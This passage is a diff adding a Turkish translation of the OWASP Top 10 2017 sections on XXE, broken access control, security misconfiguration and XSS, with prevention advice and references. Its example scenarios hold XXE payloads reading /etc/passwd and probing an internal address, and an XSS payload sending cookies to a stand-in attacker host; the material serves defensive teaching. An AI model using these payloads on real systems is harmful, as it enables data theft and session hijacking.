+<td>Varsayılan olarak, pek çok eski XML işleyicisi, XML işleme sırasında dereferans edilecek ve çalıştırılacak bir dış varlığa ait URL bilgisinin belirtilmesine izin vermektedir. <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a> araçları bağımlılıkları ve yapılandırma ayarlarını inceleyerek bu açıklığı tespit edebilmektedir. <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> araçları, bu açıklığı tespit ve istismar etmek için ilave manuel adımlar gerektirmektedir. 2017 itibariyle genellikle test edilmediği için, manuel olarak test edecek kişiler XXE testlerinin nasıl yapılacağı konusunda eğitilmelidirler.</td>
+<td>Bu açıklıklar veri ele geçirmek, sunucu üzerinden uzaktan istekte bulunmak, servis dışı bırakma saldırıları ve diğer saldırıları yürütmek için kullanılabilmektedir.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulamam-açıklığı-i̇çeriyor-mu-2">Uygulamam Açıklığı İçeriyor Mu?</h2>
+<p>Uygulamalar ve özellikle XML tabanlı web servisleri veya girdi alacak şekilde yapılan entegrasyonlar aşağıdaki durumlarda saldırıya açık olabilir:</p>
+<ul>
+<li>Uygulama özellikle güvenilmeyen kaynaklardan doğrudan XML girdisi kabul ediyorsa veya XML yüklemelerine izin veriyorsa veya daha sonra bir XML işleyicisi tarafından yorumlanacak şekilde güvenilmeyen veriyi XML dokümanına ekliyorsa.</li>
+<li>Uygulamadaki herhangi bir XML işleyicisi veya SOAP tabanlı web servisleri <a href="https://en.wikipedia.org/wiki/Document_type_definition">doküman tip tanımlarına (DTD)</a> izin veriyorsa. DTD özelliğini devre dışı bırakma yöntemi işleyiciye göre değiştiği için, <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP Kopya Kağıdı: XXE Korunması</a> gibi bir referansa başvurulması iyi bir uygulama örneğidir.</li>
+<li>Uygulama birleşik güvenlik veya tek oturum açma (SSO) amaçları doğrultusunda kimlik işleme için SAML kullanıyorsa. SAML kimlik iddiaları için XML kullanmakta ve bu da zafiyet içerebilmektedir.</li>
+<li>Uygulama SOAP 1.2 sürümünden önceki sürümleri kullanıyorsa ve XML varlıkları SOAP çerçevesine iletiliyorsa XXE saldırılarına karşı açık olabilmektedir.</li>
+<li>XXE saldırılarına karşı açık olmak uygulamanın Billion Laughs saldırısı gibi servis dışı bırakma saldırılarına da açık olduğu anlamına gelebilmektedir.</li>
+</ul>
+<h2 id="nasıl-önlenir-3">Nasıl Önlenir</h2>
+<p>XXE tespiti ve önlemesi için geliştirici eğitimi çok önemlidir. Buna ek olarak, XXE saldırılarının önlenmesi için aşağıdakiler gerekmektedir:</p>
+<ul>
+<li>Mümkün oldukça, karmaşıklığı daha az olan JSON gibi veri formatları kullanılmalı ve hassas verinin serileştirilmesinden kaçınılmalıdır.</li>
+<li>Uygulama veya üzerinde çalıştığı işletim sistemi tarafından kullanılan tüm XML işleyicileri ve kütüphaneler güncellenmeli ve yamaları yüklenmelidir. Bağımlılık kontrol araçları kullanılmalıdır. SOAP 1.2 veya üzeri sürümlere güncellenmelidir.</li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP Kopya Kağıdı: XXE Korunması</a> dokümanında da belirtildiği üzere, uygulamadaki tüm XML ayrıştırıcılarında XML dış varlıkları ve DTD işleme özelliği devre dışı bırakılmalıdır.</li>
+<li>XML dokümanları, başlıklar veya nodlar içerisindeki zararlı girdiyi önlemek için, sunucu tarafında pozitif ("beyaz liste") girdi doğrulaması, filtreleme veya sterilizasyon uygulanmalıdır.</li>
+<li>XML veya XSL dosya yükleme özelliğinin, gelen XML girdisini XSD doğrulaması veya benzer bir doğrulama ile kontrol ettiğinden emin olunmalıdır.</li>
+<li>Pek çok entegrasyon içeren büyük ve karmaşık uygulamalar için manuel kod analizi en iyi alternatif olsa da, SAST araçları kaynak kod içerisindeki XXE açıklıklarının tespitinde yardımcı olmaktadır.</li>
+</ul>
+<p>Eğer bu kontroller uygulanabilir değilse, XXE saldırılarını tespit etmek, izlemek ve engellemek için sanal yama kullanımı, API güvenlik geçitleri veya Web Uygulamaları Güvenlik Duvarları (WAF) kullanımı düşünülmelidir.</p>
+<h2 id="örnek-saldırı-senaryoları-2">Örnek Saldırı Senaryoları</h2>
+<p>Gömülü cihazlara saldırılar dahil, pek çok sayıda açık XXE sorunları tespit edilmiştir. Derin bir şekilde iç içe geçmiş bağımlılıklar dahil pek çok beklenmedik yerde XXE açıklığı bulunmaktadır. En kolay yöntem ise, eğer kabul ediliyorsa zararlı bir XML dosyası yüklemektir.</p>
+<p><strong>Senaryo #1</strong>: Saldırgan sunucudan veri ele geçirmeye çalışmaktadır:</p>
+<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+    &lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
+<p><strong>Senaryo #2</strong>: Saldırgan aşağıdaki ENTITY satırını değiştirerek sunucunun iç ağını dinlemektedir:</p>
+<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;https://192.168.1.1/private&quot; &gt;]&gt;</code></pre>
+<p><strong>Senaryo #3</strong>: Saldırgan potansiyel olarak sonu olmayan bir dosyayı dahil ederek, servis dışı bırakma saldırısı gerçekleştirmeye çalışmaktadır:</p>
+<pre><code>   &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</code></pre>
+<h2 id="kaynaklar-4">Kaynaklar</h2>
+<h3 id="owasp-3">OWASP</h3>
+<ul>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Uygulama Güvenliği Doğrulama Standardı</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection">OWASP Test Rehberi: XML Enjeksiyonu Testleri</a></li>
+<li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">OWASP XXE Açıklığı</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP Kopya Kağıdı: XXE Önlemleri</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">OWASP Kopya Kağıdı: XML Güvenliği</a></li>
+</ul>
+<h3 id="dış-kaynaklar-4">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611: Improper Restriction of XXE</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">Billion Laughs Attack</a></li>
+<li><a href="https://secretsofappsecurity.blogspot.tw/2017/01/saml-security-xml-external-entity-attack.html">SAML Security XML External Entity Attack</a></li>
+<li><a href="https://web-in-security.blogspot.tw/2014/11/detecting-and-exploiting-xxe-in-saml.html">Detecting and exploiting XXE in SAML Interfaces</a></li>
+</ul>
+<h1 id="a52017-yetersiz-erişim-kontrolü">A5:2017 Yetersiz Erişim Kontrolü</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit Etkenleri/Saldırı vektörleri</th>
+<th>Güvenlik zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim Düzeyi : İstismar Edilebilirlik 2</td>
+<td>Yaygınlık 2 : Tespit Edilebilirlik 2</td>
+<td>Teknik 3 : İş</td>
+</tr>
+<tr class="even">
+<td>Erişim kontrolü istismarı saldırganların temel bir yeteneğidir. <a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">SAST</a> ve <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> araçları erişim kontrolünün olmadığını tespit edebilir ancak olduğu durumlarda fonksiyonel olup olmadığını doğrulayamamaktadır. Erişim kontrolü manuel yöntemlerle veya belirli çerçevelerde erişim kontrolleri bulunmadığı için otomasyon aracılığıyla tespit edilebilmektedir.</td>
+<td>Erişim kontrolü açıklıkları otomatize tespitin eksikliği ve uygulama geliştiricileri tarafından etkin bir fonksiyonel test yapılmamasından dolayı yaygındır. Erişim kontrolü tespiti genellikle otomatize statik veya dinamik test ile yapılamamaktadır. HTTP metotları (GET, PUT vb.), doğrudan nesne başvuruları vb. dahil eksik veya yetersiz erişim kontrollerini tespit etmenin en iyi yolu manuel testlerdir.</td>
+<td>Teknik etki saldırganların kullanıcılar veya yöneticiler gibi davranması veya kullanıcıların yetki gerektiren fonksiyonları kullanması veya kayıt oluşturulması, kayıtlara erişilmesi, kayıtların güncellenmesi veya silinmesidir.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulamam-açıklık-i̇çeriyor-mu-1">Uygulamam Açıklık İçeriyor Mu?</h2>
+<p>Erişim kontrolü, kullanıcıların kendilerine verilen izinler dışında bir şey yapamayacağı şekilde bir politika uygulamaktadır. Uyumsuzluklar genellikle yetkisiz bilgi ifşasına, tüm verinin değiştirilmesine veya silinmesine veya kullanıcının sınırları dışında bir iş fonksiyonunun gerçekleştirilmesine yol açmaktadır. Yaygın erişim kontrolü açıklıkları şunları içermektedir:</p>
+<ul>
+<li>URL'i, iç uygulama durumunu veya HTML sayfasını değiştirerek veya basitçe özel bir API saldırı aracı kullanarak erişim kontrollerinin atlatılması.</li>
+<li>Birincil anahtarın başka bir kullanıcının kaydına göre değiştirilmesine izin vermek ve bu şekilde başkalarının hesaplarının görülmesine ve değiştirilmesine izin vermek.</li>
+<li>Yetki yükseltmesi. Giriş yapmadan bir kullanıcı gibi davranmak veya bir kullanıcı olarak girip bir yönetici gibi davranmak.</li>
+<li>Bir JSON Web Token (JWT) erişim anahtarını veya bir çerezi değiştirmek veya tekrar oynatmak gibi meta veri değiştirmek veya yetki yükseltmek için gizli alanları değiştirmek veya JWT geçersiz kılma sürecini suistimal etmek.</li>
+<li>CORS yanlış yapılandırması aracılığıyla yetkisiz API erişimleri.</li>
+<li>Kimlik doğrulaması yapılmamış bir kullanıcı olarak kimlik doğrulama gerektiren sayfalara veya standart bir kullanıcı olarak yetki gerektiren sayfalara erişim. POST, PUT ve DELETE için eksik erişim kontrolleri ile API erişimi.</li>
+</ul>
+<h2 id="nasıl-önlenir-4">Nasıl Önlenir</h2>
+<p>Erişim kontrolü sadece, saldırganın erişim kontrollerine veya meta verilere erişemeyeceği güvenilir sunucu taraflı kodda veya sunucusuz API'lerde zorunlu tutulduysa etkili olmaktadır.</p>
+<ul>
+<li>Herkese açık kaynaklar hariç diğer tüm kaynaklara erişim varsayılan olarak reddedilmelidir.</li>
+<li>CORS kullanımını azaltmak gibi erişim kontrolü mekanizmaları bir sefer oluşturulmalı ve uygulama boyunca tekrar kullanılmalıdır.</li>
+<li>Model erişim kontrolleri, kullanıcının herhangi bir kayıt oluşturabileceğini, herhangi bir kaydı okuyabileceğini, güncelleyebileceğini veya silebileceğini kabul etmek yerine, kayıt mülkiyetini gerektirmelidir.</li>
+<li>Özgün uygulama iş limiti gereksinimleri etki alanı modelleri ile uygulanmalıdır.</li>
+<li>Sunucu dizin listelemesi devre dışı bırakılmalı ve web kök dizininde dosya meta verileri (örn. .git) ve yedekleme dosyaları bulunmamalıdır.</li>
+<li>Erişim kontrolü ihlalleri loglanmalı ve uygun görüldüğünde (örn. tekrar eden ihlaller) yöneticiler uyarılmalıdır.</li>
+<li>Otomatize saldırı araçlarından gelebilecek zararları en aza indirmek için API ve kontrolör erişimi sınırlandırılmalıdır.</li>
+<li>Çıkış yapıldıktan sonra JWT anahtarları sunucuda geçersiz kılınmalıdır.</li>
+<li>Geliştiricler ve QA çalışanları fonksiyonel erişim kontrolü birim ve entegrasyon testleri yapmalıdır.</li>
+</ul>
+<h2 id="örnek-saldırı-senaryoları-3">Örnek Saldırı Senaryoları</h2>
+<p><strong>Senaryo #1</strong>: Uygulama, hesap bilgilerine erişim için bir SQL çağrısı içerisinde doğrulanmamış bir veri kullanmaktadır:</p>
+<pre><code>  pstmt.setString(1, request.getParameter(&quot;acct&quot;));
+  ResultSet results = pstmt.executeQuery();</code></pre>
+<p>Saldırgan tarayıcısında basitçe 'acct' parametresini değiştirerek istediği hesap numarasını yollayabilmektedir. Düzgün bir şekilde doğrulanmadığında, saldırgan herhangi bir kullanıcı hesabına erişebilmektedir.</p>
+<p><code>https://example.com/app/accountInfo?acct=notmyacct</code></p>
+<p><strong>Senaryo #2</strong>: Saldırgan kaba kuvvet ile hedef URL'leri gezmektedir. Yönetici sayfasına erişim için yönetici hakları gerekmektedir.</p>
+<pre><code>  https://example.com/app/getappInfo
+  https://example.com/app/admin_getappInfo</code></pre>
+<p>Eğer kimliği doğrulanmamış bir kullanıcı iki sayfadan herhangi birine erişebiliyorsa, açıklık bulunmaktadır. Eğer yönetici olmayan bir kullanıcı yönetici sayfasına erişebiliyorsa, bu bir açıklıktır.</p>
+<h2 id="kaynaklar-5">Kaynaklar</h2>
+<h3 id="owasp-4">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c7-enforce-access-controls">OWASP Proaktif Kontroller: Erişim Kontrolleri</a></li>
+<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Uygulama Güveliği Doğrulama Standardı: V4 Erişim Kontrolü</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README">OWASP Test Rehberi: Yetkilendirme Testleri</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html">OWASP Kopya Kağıdı: Erişim Kontrolü</a></li>
+</ul>
+<h3 id="dış-kaynaklar-5">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/284.html">CWE-284: Improper Access Control (Authorization)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/285.html">CWE-285: Improper Authorization</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/639.html">CWE-639: Authorization Bypass Through User-Controlled Key</a></li>
+<li><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">PortSwigger: Exploiting CORS misconfiguration</a></li>
+</ul>
+<h1 id="a62017-yanlış-güvenlik-yapılandırması">A6:2017 Yanlış Güvenlik Yapılandırması</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit etkenleri/Saldırı vektörleri</th>
+<th>Güvenlik zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim Düzeyi: İstismar Edilebilirlik 3</td>
+<td>Yaygınlık 3 : Tespit Edilebilirlik 3</td>
+<td>Teknik 2 : İş</td>
+</tr>
+<tr class="even">
+<td>Saldırganlar, sisteme erişim sağlamak için veya sistem hakkında bilgi elde etmek için yüklenmemiş yamalardan kaynaklanan açıklıkları istismar etmeye veya varsayılan hesaplara, kullanılmayan sayfalara, korunmayan dosya ve dizinlere erişmeye çalışmaktadır.</td>
+<td>Yanlış güvenlik yapılandırması ağ servisleri, platform, web sunucusu, uygulama sunucusu, veri tabanı, çerçeve yazılımlar, özel kodlar ve önceden yüklenen sanal makineler, konteynerler veya saklama alanları dahil uygulama katmanlarından herhangi birisinde ortaya çıkabilmektedir. Otomatize tarama araçları yanlış yapılandırmanın, varsayılan hesapların veya ayarların kullanımının, gereksiz servislerin, eski seçeneklerin vb. tespitinde faydalı olmaktadır.</td>
+<td>Bu tür açıklıklar sıklıkla saldırganlara bazı sistem verilerine veya fonksiyonlarına yetkisiz erişim sağlamaktadır. Bazen, bu tür açıklıklar sistemin tamamının ele geçirilmesi ile sonuçlanmaktadır. İş etkisi uygulama ve verinin korunma gereksinimlerine göre değişmektedir.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulamam-açıklığı-i̇çeriyor-mu-3">Uygulamam Açıklığı İçeriyor Mu?</h2>
+<p>Eğer uygulama aşağıdaki şartları sağlıyorsa, uygulama açıklık içeriyor olabilir:</p>
+<ul>
+<li>Uygulama katmanlarının herhangi bir parçasında uygun güvenlik sıkılaştırması bulunmuyorsa veya bulut servisleri üzerinde düzgün yapılandırılmamış izinler bulunuyorsa.</li>
+<li>Gerek duyulmayan özellikler (örn. gereksiz portlar, servisler, sayfalar, hesaplar veya yetkiler) aktif edilmişse veya yüklenmişse.</li>
+<li>Varsayılan hesaplar ve parolaları hala aktifse veya değiştirilmemişse.</li>
+<li>Hata işleme mekanizması dizin detayları içeriyorsa veya olması gerekenden daha detaylı bilgi içeren hata mesajları kullanıcılara gösteriliyorsa.</li>
+<li>Güncellenen sistemler için, son güvenlik özellikleri aktif değilse veya güvenli bir şekilde yapılandırılmamışsa.</li>
+<li>Uygulama sunucularında, uygulama çerçeve yazılımlarında (örn. Struts, Spring, ASP.NET), kütüphanelerde, veri tabanlarında vb. güvenlik ayarları güvenli değerlere sahip değilse.</li>
+<li>Sunucu güvenlik başlıklarını veya direktiflerini göndermiyorsa veya bunlar güvenli değerlere sahip değilse.</li>
+<li>Yazılım güncel değilse veya zafiyet içeriyorsa. (bkz. <strong>A9:2017-Bilinen Açıklık İçeren Bileşen Kullanımı</strong>)</li>
+</ul>
+<p>Düzenlenmiş, tekrar edilebilir uygulama güvenlik yapılandırması süreci olmadan, sistemler yüksek risk altında bulunmaktadır.</p>
+<h2 id="nasıl-önlenir-5">Nasıl Önlenir</h2>
+<p>Aşağıdakiler dahil güvenli yükleme süreçleri uygulanmalıdır:</p>
+<ul>
+<li>Kapalı başka bir ortamda, kurulumu kolaylaştıracak ve hızlandıracak bir tekrarlanabilir sıkılaştırma süreci. Geliştirme, QA ve ürün ortamları, her bir ortamda farklı giriş bilgileri kullanılacak şekilde aynı şekilde yapılandırılmalıdır. Yeni bir güvenli ortamın hazırlanması için gereken iş yükünü azaltmak için bu süreç otomatize hale getirilmelidir.</li>
+<li>Herhangi bir gereksiz özellik, bileşen, dokümantasyon veya örnek içermeyen minimal bir platform. Kullanılmayan özellikler veya çerçeveler yüklenmemeli ve varsa kaldırılmalıdır.</li>
+<li>Yama yönetim sürecinin bir parçası olarak tüm güvenlik notlarına, güncellemelerine ve yamalarına uygun yapılandırmaları gözden geçirme ve güncelleme görevi (bkz. <strong>A9:2017-Bilinen Açıklık İçeren Bileşen Kullanımı</strong>). Özellikle, bulut depolama izinleri (örn. S3 bucket izinleri) gözden geçirilmelidir.</li>
+<li>Segmentasyon, konteyner kullanımı veya bulut güvenlik grupları (ACL) ile bileşenler arasında güvenli ve etkin bir ayırım sağlayan parçalara ayrılmış bir uygulama mimarisi.</li>
+<li>Güvenlik direktiflerinin istemciye gönderilmesi, örn. <a href="https://owasp.org/www-project-secure-headers/">Güvenlik Başlıkları</a>.</li>
+<li>Tüm ortamlardaki yapılandırmanın ve ayarların etkinliğini doğrulamak için otomatize bir süreç.</li>
+</ul>
+<h2 id="örnek-saldırı-senaryoları-4">Örnek Saldırı Senaryoları</h2>
+<p><strong>Senaryo #1</strong>: Uygulama sunucusu ürün ortamından kaldırılmamış örnek uygulamalar ile birlikte gelmiştir. Bu örnek uygulamalar saldırganların sunucuyu ele geçirmek için kullanacağı birtakım bilinen güvenlik açıklıkları içermektedir. Eğer bu uygulamalardan birisi yönetici konsolu ise ve varsayılan hesaplar değiştirilmemişse, saldırgan varsayılan parola ile giriş yapabilmekte ve yetkileri devralmaktadır.</p>
+<p><strong>Senaryo #2</strong>: Dizin listeleme sunucu üzerinde devre dışı bırakılmamıştır. Saldırgan dizinleri listeleyebileceğini kolayca tespit edecektir. Saldırgan kaynak koda çevireceği ve kodu görmek için ters mühendislik yapabileceği derlenmiş Java sınıflarını bulabilecek ve indirebilecektir. Saldırgan daha sonra uygulama üzerinde ciddi bir erişim kontrolü zafiyeti bulabilecektir.</p>
+<p><strong>Senaryo #3</strong>: Uygulama sunucu yapılandırması kullanıcılara detaylı hata mesajlarının, örn. dizin detaylarının, döndürülmesine izin vermektedir. Bu durum hassas bilgileri ifşa etmekte veya açıklık içerdiği bilinen bileşen sürümleri gibi başka açıklıklar hakkında bilgi vermektedir.</p>
+<p><strong>Senaryo #4</strong>: Bir bulut servis sağlayıcısı, varsayılan olarak diğer CSP kullanıcıları tarafından İnternet üzerinde paylaşma izni içermektedir. Bu durum bulut depolama alanında saklanan hassas veriye erişilmesine izin vermektedir.</p>
+<h2 id="kaynaklar-6">Kaynaklar</h2>
+<h3 id="owasp-5">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README">OWASP Test Rehberi: Yapılandırma Yönetimi</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README">OWASP Test Rehberi: Hata Kodlarının Testi</a></li>
+<li><a href="https://owasp.org/www-project-secure-headers/">OWASP Güvenlik Başlıkları Projesi</a></li>
+</ul>
+<p>Bu alanda ilave gereksinimler için, bkz. Uygulama Güvenliği Doğrulama Standardı <a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x22-V14-Config.md">V19 Yapılandırma</a>.</p>
+<h3 id="dış-kaynaklar-6">Dış Kaynaklar</h3>
+<ul>
+<li><a href="https://csrc.nist.gov/publications/detail/sp/800-123/final">NIST Guide to General Server Hardening</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/2.html">CWE-2: Environmental Security Flaws</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/388.html">CWE-388: Error Handling</a></li>
+<li><a href="https://www.cisecurity.org/cis-benchmarks/">CIS Security Configuration Guides/Benchmarks</a></li>
+<li><a href="https://blog.websecurify.com/2017/10/aws-s3-bucket-discovery.html">Amazon S3 Bucket Discovery and Enumeration</a></li>
+</ul>
+<h1 id="a72017-siteler-arası-betik-çalıştırma-xss">A7:2017 Siteler Arası Betik Çalıştırma (XSS)</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Tehdit etkenleri/Saldırı vektörleri</th>
+<th>Güvenlik zafiyeti</th>
+<th>Etkiler</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Erişim Düzeyi : İstismar Edilebilirlik 3</td>
+<td>Yaygınlık 3 : Tespit Edilebilirlik 3</td>
+<td>Teknik 2 : İş</td>
+</tr>
+<tr class="even">
+<td>Otomatize araçlar XSS'in 3 türünü de tespit ve istismar edebilmektedir. Ayrıca ücretiz olarak erişilebilir istismar araçları da bulunmaktadır.</td>
+<td>XSS OWASP İlk 10 içerisindeki en yaygın ikinci problemdir ve tüm uygulamaların yaklaşık üçte ikisinde görülmektedir. Otomatize araçlar, özellikle PHP, J2EE / JSP ve ASP.NET gibi olgun teknolojilerde otomatik olarak bazı XSS problemlerini bulabilmektedir.</td>
+<td>Yansıtılmış ve DOM XSS için etki orta düzeyde ve depolanmış XSS için giriş bilgilerini ve oturumları çalma veya kurbana zararlı yazılım bulaştırma gibi kurbanın tarayıcısında uzaktan kod çalıştırmada olduğu gibi ciddi düzeydedir.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="uygulamam-açıklık-i̇çeriyor-mu-2">Uygulamam Açıklık İçeriyor Mu?</h2>
+<p>Genellikle kullanıcıların tarayıcılarını hedef alan XSS'in üç farklı türü bulunmaktadır:</p>
+<ul>
+<li><strong>Yansıtılmış XSS</strong>: Uygulama veya API, HTML çıktısının bir parçası olarak doğrulanmamış veya sterilize edilmemiş kullanıcı girdisi içermektedir. Başarılı bir saldırı saldırganın kurbanın tarayıcısında istediği HTML veya JavaScript kodunu çalıştırmasına izin vermektedir. Genellikle, kullanıcının zararlı Watering Hole web sayfaları, reklamlar veya benzerleri gibi saldırgan tarafından kontrol edilen bir sayfaya işaret eden kötücül bir bağlantı ile etkileşime geçmesi gerekmektedir.</li>
+<li><strong>Depolanmış XSS</strong>: Uygulama veya API başka bir kullanıcı veya bir yönetici tarafından daha sonra görüntülenecek sterilize edilmemiş bir kullanıcı girdisini saklamaktadır. Depolanmış XSS genellikle yüksek veya kritik bir bulgu olarak değerlendirilmektedir.</li>
+<li><strong>DOM XSS</strong>: Bir sayfa üzerinde saldırgan tarafından kontrol edilebilen veriyi dinamik olarak ekleyen JavaScript çerçeveleri, tek sayfa uygulamaları ve API'ler DOM XSS zafiyeti içermektedir. İdeal olarak, uygulama saldırgan tarafından kontrol edilen veriyi güvensiz JavaScript API'lerine yollamayacaktır.</li>
+</ul>
+<p>Sıradan XSS saldırıları oturum çalma, hesap ele geçirme, MFA atlatma, DOM nod değiştirme veya bozma (trojan giriş panelleri gibi), zararlı yazılım indirme, klavye kaydetme ve diğer istemci taraflı saldırılar gibi kullanıcının tarayıcısına karşı yapılan saldırılardır.</p>
+<h2 id="nasıl-önlenir-6">Nasıl Önlenir</h2>
+<p>XSS açıklığının önlenmesi güvenilmeyen verinin aktif tarayıcı içeriğinden ayırılmasını gerektirmektedir. Bu aşağıdakiler aracılığıyla yapılabilmektedir:</p>
+<ul>
+<li>Ruby on Rails, React JS gibi tasarımsal olarak XSS'i kendiliğinden sterilize eden çerçevelerin kullanımı. Her bir çerçevenin XSS koruma limitleri öğrenilmeli ve kapsamları dışında kalan kullanım örneklerinin üstesinden gelinmelidir.</li>
+<li>HTML çıktısında yer aldığı bağlama göre (body, attribute, JavaScript, CSS veya URL) güvenilmeyen HTTP isteği girdilerinin sterilize edilmesi Yansıtılmış ve Depolanmış XSS açıklıklarını çözecektir. <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Kopya Kağıdı: XSS Korumaları</a> gerekli veri sterilizasyon teknikleri ile ilgili detayları içermektedir.</li>
+<li>İstemci tarafındaki tarayıcı dokümanı değiştirilirken bağlama duyarlı kodlamanın kullanılması DOM XSS açıklığına karşı koruma sağlamaktadır. Bu durum kaçınılmaz olduğunda, OWASP Kopya Kağıdı: DOM tabanlı XSS Koruması isimli dokümanda belirtildiği gibi bağlama duyarlı strelizasyon teknikleri tarayıcı API'lerine uygulanabilir.</li>
+<li>XSS'e karşı derinlemesine savunma kontrolü olarak bir <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">İçerik Güvenlik Politikası'nın (CSP)</a> kullanılması. Eğer iç dosya ekleme(örn. dizin aşımı veya izin verilen içerik teslim ağlarından zafiyet içeren kütüphaneler) aracılığıyla zararlı kodun eklenmesine yol açabilecek başka bir açıklık bulunmuyorsa, etkili olacaktır.</li>
+</ul>
+<h2 id="örnek-saldırı-senaryoları-5">Örnek Saldırı Senaryoları</h2>
+<p><strong>Senaryo #1</strong>: Uygulama doğrulama veya sterilizasyon olmadan aşağıdaki HTML parçasının oluşturulmasında güvenilmeyen veriyi kullanmaktadır.</p>
+<p><code>(String) page += "&lt;input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'&gt;";</code> Saldırgan tarayıcısında 'CC' parametresini aşağıdaki gibi değiştirmektedir:</p>
+<p><code>'&gt;&lt;script&gt;document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie&lt;/script&gt;'</code></p>
+<p>Bu saldırı kurbanın oturum ID değerinin saldırganın sitesine yollanmasına yol açmakta, bu durum da saldırganın kullanıcının mevcut oturumunu ele geçirmesine izin vermektedir.</p>
+<p><strong>Not</strong>: Saldırganlar uygulamada kullanılacak herhangi bir otomatize Siteler Arası İstek Sahteciliği (CSRF) korumasını atlatmak için XSS açıklığını kullanabilmektedir.</p>
+<h2 id="kaynaklar-7">Kaynaklar</h2>
+<h3 id="owasp-6">OWASP</h3>
+<ul>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data">OWASP Proaktif Kontroller: Verinin Kodlanması</a></li>
+<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data">OWASP Proaktif Kontroller: Verinin Doğrulanması</a></li>
+<li><a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Uygulama Güvenliği Doğrulama Standardı: V5</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">OWASP Test Rehberi: Yansıtılmış XSS Testleri</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting">OWASP Test Rehberi: Depolanmış XSS Testleri</a></li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting">OWASP Test Rehberi: DOM XSS Testleri</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Kopya Kağıdı: XSS Önlemleri</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">OWASP Kopya Kağıdı: DOM tabanlı XSS Önlemleri</a></li>
+<li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">OWASP Kopya Kağıdı: XSS Filtre Atlatma</a></li>
